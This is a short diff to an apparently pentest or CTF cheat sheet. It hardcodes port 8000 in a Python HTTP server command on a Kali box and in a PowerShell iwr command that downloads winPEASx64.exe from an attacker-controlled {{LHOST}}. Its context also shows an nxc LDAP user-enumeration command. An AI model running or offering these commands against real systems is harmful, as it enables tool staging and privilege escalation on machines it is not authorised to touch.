@@ -38,11 +38,11 @@ nxc ldap {{DC}} -d '{{DOMAIN}}' -u '{{USER}}' -p '{{PASS}}' --users
 
 ```bash
 cd /home/kali/tools/binaries
-python3 -m http.server {{LPORT}}
+python3 -m http.server 8000
 ```
 
 ## Download WinPEAS in PowerShell
 
 ```powershell
-iwr -UseBasicParsing -Uri 'http://{{LHOST}}:{{LPORT}}/winPEASx64.exe' -OutFile '.\winPEASx64.exe'
+iwr -UseBasicParsing -Uri 'http://{{LHOST}}:8000/winPEASx64.exe' -OutFile '.\winPEASx64.exe'
 ```
